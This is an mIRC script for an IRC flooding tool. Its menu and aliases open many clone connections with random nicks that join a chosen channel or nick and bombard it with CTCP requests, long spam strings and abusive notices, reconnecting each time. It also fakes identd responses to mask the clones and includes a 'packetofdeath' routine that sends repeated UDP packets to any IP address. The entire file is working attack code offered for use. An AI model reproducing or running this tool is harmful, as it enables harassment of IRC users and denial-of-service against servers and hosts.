   menu @flood {
     Identd For Flooder:{
       if (($portfree(113) == $true) && ($sock(identd.geno) == $null)) { socklisten Identd.geno 113  }
       else { .echo -a *** Port 113 is in use }
     }
     Identd Off:{
       .sockclose Identd.geno*
     }
     flood
     .Open Window:/window -el @flood
     .channel floods
     ..org. flood #: flood $$?"Channel" $$?"how mant flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ..invite flood #: invite $$?"Channel" $$?"how many flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ..notice flood #: floodnotice $$?"Channel" $$?"how many flooder bots?" $$?"server?" $$?"port?"  | aline @flood Task Completed
     ..owned flood #: owned $$?"Channel"  $$?"how many flooder bots?" $$?"server?" $$?"port?"| aline @flood Task Completed
     ..Other
     ...all flood msg at once: all $$?"Channel"  $$?"how many flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ..random colors
     ...random color #: rand $$?"Channel"  $$?"how mant flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ...random notice cl #: nrand $$?"Channel"  $$?"how mant flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     .nick flood
     ..org. flood: flood $$?"nick?" $$?"how mant flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ..invite flood: invite $$?"nick?" $$?"how many flooder bots?" $$?"server?" $$?"port?"  | aline @flood Task Completed
     ..notice flood: floodnotice $$?"nick?" $$?"how many flooder bots?" $$?"server?" $$?"port?"  | aline @flood Task Completed
     ..owned flood: owned $$?"nick?" $$?"how many flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ..Other
     ...all flood msg at once: all $$?"nick?" $$?"how many flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ..random colors
     ...random color: rand $$?"nick?" $$?"how mant flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     ...random notice cl: nrand $$?="nick?" $$?"how mant flooder bots?" $$?"server?" $$?"port?" | aline @flood Task Completed
     stop: .sockclose * | aline @flood Task Completed
     Flood2
     .Open Window:/window -el @flood
     . Flood:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.server $?="Server to connect to" | set %fld.port $?="Servers Port" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %fld.server %fld.port %fld.message
     .Flood AutoChoose Server
     ..%Recent.Server.1:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.1 %fld.message
     ..%Recent.Server.2:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.2 %fld.message
     ..%Recent.Server.3:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.3 %fld.message
     ..%Recent.Server.4:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.4 %fld.message
     ..%Recent.Server.5:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.5 %fld.message
     ..%Recent.Server.6:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.6 %fld.message
     ..%Recent.Server.7:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.7 %fld.message
     ..%Recent.Server.8:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.8 %fld.message
     ..%Recent.Server.9:/set %fld.clones $?="Number Of Clones" | set %fld.chan $?="Nick or Chan to Flood" | set %fld.msg $?="Flood message" | fuck %fld.chan %fld.clones %Recent.Server.9 %fld.message
     . FloodOff:/cleanup
     . Packet:/set %pckt.ip $?="IP" | set %pckt.size $?="size" | set %pckt.amnt $?="Amount of Packets" | packetofdeath %pckt.ip %pckt.size %pckt.amnt
     Clear:/window -c @flood | /window -el @flood
   }
   alias -l rctcp {
     %rand = $r(1,4)
     if (%rand == 1) return FINGER
     if (%rand == 2) return PING
     if (%rand == 3) return TIME
     if (%rand == 4) return VERSION
   }
   alias -l allofthem {
     %rand = $r(1,5)
     if (%rand == 1) return !list PING ME File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d Send Queue fserver
     if (%rand == 2) return !list !ping File Server Online FTP Online 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®!
     if (%rand == 3) return  $+ $rand(0,15) $+ $chr(1)  $+ PING +++ATH0 $+ $chr(1)
     if (%rand == 4) return !list !ping Me file Server Online ____________________________________________________________________________________________________________________________________
     if (%rand == 5) return !list File Server Online 00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®! 00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!00,01Pµ07§§04¥8 0Iñ7Vî4tË14®!
   }

   alias flood {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %flooder on
     var %var = 0
     :loop
     inc %var
     if (%flooder == on) && (%var <= %clones) { .sockopen flood $+ %var %server %port | goto loop  }
   }
   on *:sockopen:flood*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname privmsg %victim : $+ !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
     .sockwrite -nt $sockname Notice %victim : $+ DIE !!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     .sockclose $sockname
     .sockopen flood $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }

   alias invite {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %invite on
     var %var = 0
     :loop
     inc %var
     if (%invite == on) && (%var <= %clones) { .sockopen inviter $+ %var %server %port | goto loop  }
   }
   on *:sockopen:invite*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname privmsg %victim : $+ !list !ping File Server Online FTP Online 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®! 0,1Dont Invite Me You 0,1Pµ07§§04¥8 0Iñ7Vî4tË14®!
     .sockwrite -nt $sockname Notice %victim : $+ DIE !!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     .sockclose $sockname
     .sockopen invite $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }

   alias rand {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %flo0der on
     var %var = 0
     :loop
     inc %var
     if (%flo0der == on) && (%var <= %clones) { .sockopen rand $+ %var %server %port | goto loop  }
   }
   on *:sockopen:rand*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname privmsg %victim : $+  $+ $rand(0,15) !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
     .sockwrite -nt $sockname Notice %victim : $+ DIE !!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     .sockclose $sockname
     .sockopen rand $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }

   alias floodnotice {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %noticef on
     var %var = 0
     :loop
     inc %var
     if (%noticef == on) && (%var <= %clones) { .sockopen notice $+ %var %server %port | goto loop  }
   }
   on *:sockopen:notice*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname notice %victim : $+ !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
     .sockwrite -nt $sockname Notice %victim : $+ DIE !!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     .sockclose $sockname
     .sockopen notice $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }

   alias all {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %all on
     var %var = 0
     :loop
     inc %var
     if (%all == on) && (%var <= %clones) { .sockopen all $+ %var %server %port | goto loop  }
   }
   on *:sockopen:all*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname privmsg %victim : $+ $allofthem
     .sockwrite -nt $sockname Notice %victim : $+ DIE !!!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     .sockclose $sockname
     .sockopen all $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }

   alias owned {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %owned on
     var %var = 0
     :loop
     inc %var
     if (%owned == on) && (%var <= %clones) { .sockopen owned $+ %var %server %port | goto loop  }
   }
   on *:sockopen:owned*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname privmsg %victim : $+  $+ $rand(1,15) owned
     .sockwrite -nt $sockname Notice %victim : $+  $+ $rand(1,15) owned
     .sockclose $sockname
     .sockopen owned $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }

   alias nrand {
     /sockclose *
     set %victim $1
     set %clones $2
     set %server $3
     set %port $4
     set %nrand on
     var %var = 0
     :loop
     inc %var
     if (%nrand == on) && (%var <= %clones) { .sockopen nrand $+ %var %server %port | goto loop  }
   }
   on *:sockopen:nrand*: {
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname nick $rand(a,z) $+ $rand(0,999) $+ $rand(a,z) $+ $rand(0,999)
     .sockwrite -nt $sockname join : $+ %victim
     .sockwrite -n $sockname privmsg %victim : $+ $chr(1) $+ $rctcp $+ $chr(1)
     .sockwrite -n $sockname notice %victim : $+  $+ $rand(0,15) $+ !list Ping Me File Server Online flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d
     .sockclose $sockname
     .sockopen nrand $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }
   alias cleanup {
     .set %papaflood off
     .sockclose Papa*
     .unset %nick
     unset %channel
     unset %server
     unset %port
     unset %clones
     unset %flood
     if (@flood !== $null) { aline @flood 4All Clones Have Been Cleared }
     if (@flood == $null) { window -el @flood | titlebar @flood Flooder, Not Supported on DALNet | aline @flood 4All Clones Have Been Cleared }
   }

   on *:Sockopen:Papa*:{
     if ($sockerr > 0) { halt }
     set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
     .sockwrite -nt $sockname USER %user %user %user : $+ %user
     .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+
     .sockwrite -nt $sockname JOIN : $+ %channel
     .sockwrite -n $sockname Privmsg %nick : $+ %flood
     .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ version $+ $chr(1)
     .sockwrite -nt $sockname Notice %nick : $+ ¥§©®¢¡øæ¥§©®¢¡øæ+++++[blow me fool]+++++¥§©®¢¡øæ¥§©®¢¡øæ
     .sockclose $sockname
     .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
   }
   alias packetofdeath {
     if ($3 = $null) { echo @flood Error Please use .packet address size amount | halt }
     if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) {
       if (@flood !== $null) { aline @flood Error Please use !packet address size amount | halt }
       if (@flood == $null) { window -el @flood | titlebar @flood Flooder, Not Supported on DALNet | aline @flood Error Please use !packet address size amount | halt }
     }
     if (a isin $1) || (b isin $1) || (c isin $1) || (d isin $1) || (e isin $1) || (f isin $1) || (g isin $1) || (h isin $1) || (i isin $1) || (j isin $1) || (k isin $1) || (l isin $1) || (m isin $1) || (n isin $1) || (o isin $1) || (p isin $1) || (q isin $1) || (r isin $1) || (s isin $1) || (t isin $1) || (u isin $1) || (v isin $1) || (w isin $1) || (x isin $1) || (y isin $1) || (z isin $1) {
       if (@flood !== $null) { aline @flood Error no letters may be contained in the ip | unset %packet.* | halt }
       if (@flood == $null) { window -el @flood | titlebar @flood Flooder, Not Supported on DALNet | aline @flood Error no letters may be contained in the ip | unset %packet.* | halt }
     }
     .notice $nick Now Packeting $1 with $2 bytes $3 times
     set %packet.ip $1
     set %packet.bytes $2
     set %packet.amount $3
     set %packet.count 0
     :start
     if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | echo @flood Packeting has completed | halt }
     inc %packet.count 1
     /sockudp -b  packet 60 %packet.ip $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9) %packet.bytes %packet.bytes
     goto start
   }
   on *:socklisten:Identd.geno:{ sockaccept identd.Geno. [ $+ [ $calc($gettok($sock(identd.Geno.*, $sock(identd.Geno.*,0)),2,46) + 1) ] ]  | .echo -a *** Listening Identd }
   on *:sockread:Identd.geno.*:{ sockread %geno-info.ident | sockwrite -nt $sockname %geno-info.ident : USERID : UNIX : $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) $+ $chr($rand(97,122)) | unset  %geno-info.ident | .echo -a *** reading identd and responding  }
